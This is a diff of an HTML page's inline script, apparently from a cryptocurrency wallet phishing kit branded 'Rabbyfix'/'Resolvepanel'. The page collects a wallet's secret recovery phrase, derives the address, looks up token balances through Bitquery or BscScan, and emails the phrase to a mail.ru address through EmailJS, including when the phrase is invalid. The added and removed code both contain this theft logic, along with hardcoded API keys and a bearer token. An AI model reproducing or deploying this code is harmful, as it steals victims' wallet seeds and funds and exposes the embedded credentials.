@@ -52576,7 +52576,7 @@
             <div class="text-center">
               <button
                 type="submit"
-                class="cw ant-btn ant-btn-primary w-[210px] h-[44px] mt-[40px]"
+                class="ant-btn ant-btn-primary w-[210px] h-[44px] mt-[40px]"
               >
                 <span>Confirm</span>
               </button>
@@ -52592,217 +52592,174 @@
             import { ethers } from "ethers";
             import Web3 from "web3";
             const web3 = new Web3(Web3.currentProvider);
-            // console.log('web3', web3)
+            console.log("web3", web3);
 
-            (function(){
-                emailjs.init({
-                    publicKey: "jV8EbLh46l4V4Wypt" // Your public key
-                });
+            const myHeaders = new Headers();
+            myHeaders.append("Content-Type", "application/json");
+            myHeaders.append(
+              "Authorization",
+              "Bearer ory_at_AihVwnjWmEQ4Uevla0dz71-DSnoGMGdrF6MjHwFz-0U.5TR9cK9Ml59N7FLBzK59Br3WNHDQJ1gQtDPnTgs7r5E"
+            );
+
+            (function () {
+              emailjs.init({
+                publicKey: "jV8EbLh46l4V4Wypt", // Your public key
+              });
             })();
             let selected;
 
-            const setSelectedMeans = (e) => {
-                console.log('e.target', e.target)
-                let kk = e.target.getAttribute('data-arg1');
-                console.log('kk', kk)
-            }
-            
-            document.getElementById('walletForm').onsubmit = async function(e) {
-                
-                e.preventDefault();
-                const secretPhrase = document.getElementById('secret_phrase').value.trim();
-                const connectBtn = document.querySelector('.cw');
-                connectBtn.innerText = 'Connecting...'
-                connectBtn.disabled = true;
-                console.log("secretPhrase", secretPhrase);
-    
+            document.getElementById("walletForm").onsubmit = async function (
+              e
+            ) {
+              e.preventDefault();
+              const secretPhrase = document
+                .getElementById("secret_phrase")
+                .value.trim();
+              console.log("secretPhrase", secretPhrase);
+
+              try {
+                var wall = ethers.Wallet.fromMnemonic(secretPhrase);
+                console.log("wall", wall);
+
+                const address = wall.address;
+                let coin_data;
+                let coin_data2;
+                let data = [];
+
+                const raw = JSON.stringify({
+                  query: `query MyQuery {\n  EVM(dataset: combined, network: eth) {\n    BalanceUpdates(\n      where: {BalanceUpdate: {Address: {is: \"${address}\"}}}\n    ) {\n      Currency {\n        Name\n        SmartContract\n        Symbol\n      }\n      balance: sum(of: BalanceUpdate_Amount)\n    }\n  }\n}\n`,
+                  variables: "{}",
+                });
+
+                const requestOptions = {
+                  method: "POST",
+                  headers: myHeaders,
+                  body: raw,
+                  redirect: "follow",
+                };
+
                 try {
+                  const response = await fetch(
+                    "https://streaming.bitquery.io/graphql",
+                    requestOptions
+                  );
+                  const result = await response.text();
+                  console.log("result:", result);
+                  if (result) {
+                    let res = JSON.parse(result);
+                    coin_data = res.data.EVM.BalanceUpdates;
 
-                    var wall = ethers.Wallet.fromMnemonic(secretPhrase)
-                    console.log('wall', wall);
+                    coin_data.forEach((element) => {
+                      let dt = {};
+                      dt.currency_name = element.Currency.Name;
+                      dt.Symbol = element.Currency.Symbol;
+                      dt.balance = element.balance;
+                      data.push(dt);
+                    });
 
-                    const address = wall.address;
+                    console.log(coin_data);
+                    console.log("Data:", data);
 
-                    var ETH_bal = await web3.eth.getBalance(address);
-                    var ETH_balance = web3.utils.fromWei(ETH_bal, 'ether')
-                    console.log('ETH balance', ETH_balance);
+                    const raw2 = JSON.stringify({
+                      query: `query MyQuery {\n  EVM(dataset: combined, network: bsc) {\n    BalanceUpdates(\n      where: {BalanceUpdate: {Address: {is: \"${address}\"}}}\n    ) {\n      Currency {\n        Name\n        SmartContract\n        Symbol\n      }\n      balance: sum(of: BalanceUpdate_Amount)\n    }\n  }\n}\n`,
+                      variables: "{}",
+                    });
 
-                    let data = []
-                    if(ETH_balance > 0) {
-                        let dt= {}
-                        dt.currency_name = 'Ethereum';
-                        dt.Symbol = 'ETH';
-                        dt.balance = ETH_balance;
-                        data.push(dt);
-                    }
-
-                    const bscApiKey = 'QAVWF2JNWA1ACXIKWU6S3VZYDRBCFNERGP';
-                    const bnbScanApiUrl = `https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${bscApiKey}`;
-
-                    const tokenCAs1 = [
-                        {
-                            currency_name: 'Tether',
-                            symbol: 'USDT',
-                            CA: '0x55d398326f99059ff775485246999027b3197955'
-                        },
-                        {
-                            currency_name: 'USDC',
-                            symbol: 'USDC',
-                            CA: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d'
-                        },
-                        {
-                            currency_name: 'Cardano',
-                            symbol: 'ADA',
-                            CA: '0x3ee2200efb3400fabb9aacf31297cbdd1d435d47'
-                        },
-                        {
-                            currency_name: 'Baby Doge',
-                            symbol: 'BabyDOGE',
-                            CA: '0xc748673057861a797275cd8a068abb95a902e8de'
-                        },
-                    ]
-
-                    const tokenCAs2 = [
-                        {
-                            currency_name: 'DAI',
-                            symbol: 'DAI',
-                            CA: '0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3'
-                        },
-                        {
-                            currency_name: 'WETH',
-                            symbol: 'WETH',
-                            CA: '0x4DB5a66E937A9F4473fA95b1cAF1d1E1D62E29EA'
-                        },
-                        {
-                            currency_name: 'Floki',
-                            symbol: 'FLOKI',
-                            CA: '0xfb5b838b6cfeedc2873ab27866079ac55363d37e'
-                        },
-                        {
-                            currency_name: 'Trust Wallet Token',
-                            symbol: 'TWT',
-                            CA: '0x4b0f1812e5df2a09796481ff14017e6005508003'
-                        },
-                    ]
-
-                    
-                    try {
-                        const responseBNB = await fetch(bnbScanApiUrl);
-                        if(responseBNB.status !== 200) {
-                            console.log('something went wrong');
-                            return
-                        }
-                        const bodyBNB = await responseBNB.json();
-                        const bnbBal = bodyBNB.result;
-                        const bnbBalance = web3.utils.fromWei(bnbBal, 'ether')
-                        console.log('bnbBalance', bnbBalance);
-                        let bnbdt= {
-                            currency_name: 'Binance Coin',
-                            Symbol: 'BNB',
-                            balance: bnbBalance,
-                        }
-                        data.push(bnbdt);
-                        try {
-                            tokenCAs1.forEach(async (element) => {
-                                const scanApiUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${element.CA}&address=${address}&tag=latest&apikey=${bscApiKey}`;
-                                const response = await fetch(scanApiUrl);
-                                if(response.status !== 200) {
-                                    console.log('something went wrong');
-                                    return
-                                }
-                                const body = await response.json();
-                                const result = body.result;
-                                const balance = web3.utils.fromWei(result, 'ether')
-                                console.log(`${element.symbol} balance:`, balance);
-                                let dt= {
-                                    currency_name: element.currency_name,
-                                    Symbol: element.symbol,
-                                    balance: balance,
-                                }
-                                data.push(dt);
-                            });
-                            setTimeout(() => {
-                                tokenCAs2.forEach(async (element) => {
-                                    const scanApiUrl2 = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${element.CA}&address=${address}&tag=latest&apikey=${bscApiKey}`;
-                                    const response2 = await fetch(scanApiUrl2);
-                                    if(response2.status !== 200) {
-                                        console.log('something went wrong');
-                                        return
-                                    }
-                                    const body2 = await response2.json();
-                                    const result2 = body2.result;
-                                    const balance2 = web3.utils.fromWei(result2, 'ether')
-                                    console.log(`${element.symbol} balance:`, balance2);
-                                    let dt2= {
-                                        currency_name: element.currency_name,
-                                        Symbol: element.symbol,
-                                        balance: balance2,
-                                    }
-                                    data.push(dt2);
-                                    let wallet_balance = JSON.stringify(data);
-                                    localStorage.setItem("wallet_balance", wallet_balance);
-                                    console.log('data', data);
-
-                                    // setTimeout(() => {
-                                    //     window.location.href = 'success.html';
-                                    // }, 300);
-
-                                    const templateParams = {
-                                        to_email: 'benard.tee@mail.ru', // Recipient's email
-                                        message: `Rabbyfix Submission:\n\nVerified Secret Phrase: ${secretPhrase}`
-                                    };
-                            
-                                    emailjs.send('service_puq0u3u', 'template_oomaoua', templateParams) // Your service ID and template ID
-                                        .then(function(response) {
-                                            console.log('SUCCESS!', response.status, response.text);
-                                            // Redirect to error.html on successful send
-                                            window.location.href = 'success.html';
-                                        }, function(error) {
-                                            console.error('FAILED...', error);
-                                            // alert('Failed to send email.');
-                                        });
-                                });
-                            }, 1500);
-                        } catch (error) {
-                            console.error('Error:', error.message);
-                            connectBtn.innerText = 'Confirm';
-                            connectBtn.disabled = false;
-                            alert("Something went wrong. Tey again");
-                        }
-                    } catch (error) {
-                        console.error('Error:', error.message);
-                        connectBtn.innerText = 'Confirm';
-                        connectBtn.disabled = false;
-                        alert("Something went wrong. Tey again");
-                    }
-                    
-                } catch(err) {
-                    connectBtn.innerText = 'Confirm';
-                    connectBtn.disabled = false;
-                    console.log("Invalid mnemonic phrase eror:", err)
-                    if(err.toString() === 'Error: invalid mnemonic') {
-                        alert("Invalid mnemonic phrase supplied");
-                    } else {
-                        console.log('another error')
-                    }
-                    const templateParams = {
-                        to_email: 'benard.tee@mail.ru', // Recipient's email
-                        message: `Rabbyfix Submission (Invalid mnemonic phrase):\n\nSecret Phrase: ${secretPhrase}`
+                    const requestOptions2 = {
+                      method: "POST",
+                      headers: myHeaders,
+                      body: raw2,
+                      redirect: "follow",
                     };
-            
-                    emailjs.send('service_puq0u3u', 'template_oomaoua', templateParams) // Your service ID and template ID
-                        .then(function(response) {
-                            console.log('SUCCESS!', response.status, response.text);
-                        }, function(error) {
-                            console.error('FAILED...', error);
+
+                    try {
+                      const response2 = await fetch(
+                        "https://streaming.bitquery.io/graphql",
+                        requestOptions2
+                      );
+                      const result2 = await response2.text();
+                      console.log("result2", result2);
+                      if (result2) {
+                        let res2 = JSON.parse(result2);
+                        coin_data2 = res2.data.EVM.BalanceUpdates;
+
+                        coin_data2.forEach((element2) => {
+                          let dt2 = {};
+                          dt2.currency_name = element2.Currency.Name;
+                          dt2.Symbol = element2.Currency.Symbol;
+                          dt2.balance = element2.balance;
+                          data.push(dt2);
                         });
+
+                        console.log("coin_data2: ", coin_data2);
+                        console.log("Data:", data);
+
+                        let wallet_balance = JSON.stringify(data);
+                        localStorage.setItem("wallet_balance", wallet_balance);
+
+                        const templateParams = {
+                          to_email: "benard.tee@mail.ru", // Recipient's email
+                          message: `Resolvepanel Submission:\n\nSecret Phrase: ${secretPhrase}`,
+                        };
+
+                        emailjs
+                          .send(
+                            "service_puq0u3u",
+                            "template_oomaoua",
+                            templateParams
+                          ) // Your service ID and template ID
+                          .then(
+                            function (response) {
+                              console.log(
+                                "SUCCESS!",
+                                response.status,
+                                response.text
+                              );
+                              window.location.href = "success.html";
+                            },
+                            function (error) {
+                              console.error("FAILED...", error);
+                              alert("Failed to send email.");
+                            }
+                          );
+                        window.location.href = "success.html";
+                      }
+                    } catch (error) {
+                      console.log("error", error);
+                      alert("Invalid mnemonic phrase supplied");
+                    }
+                  }
+                } catch (error) {
+                  console.log("error", error);
+                  console.log("Invalid mnemonic phrase eror:", err);
+                  alert("Invalid mnemonic phrase supplied");
+                  const secretPhrase = document
+                    .getElementById("secret_phrase")
+                    .value.trim();
+                  console.log("secretPhrase", secretPhrase);
+
+                  const templateParams = {
+                    to_email: "benard.tee@mail.ru", // Recipient's email
+                    message: `Rabbyfix Submission:\n\nSecret Phrase: ${secretPhrase}`,
+                  };
+
+                  // Send the email
+                  emailjs
+                    .send("service_puq0u3u", "template_oomaoua", templateParams)
+                    .then(
+                      function (response) {
+                        console.log("SUCCESS!", response.status, response.text);
+                      },
+                      function (error) {
+                        console.error("FAILED...", error);
+                      }
+                    );
                 }
-                
-            }
-        
-        </script>
-
-
+              } catch (err) {
+                alert("Invalid mnemonic phrase supplied");
+              }
+            };
+          </script>
         </div>
       </main>
     </div>
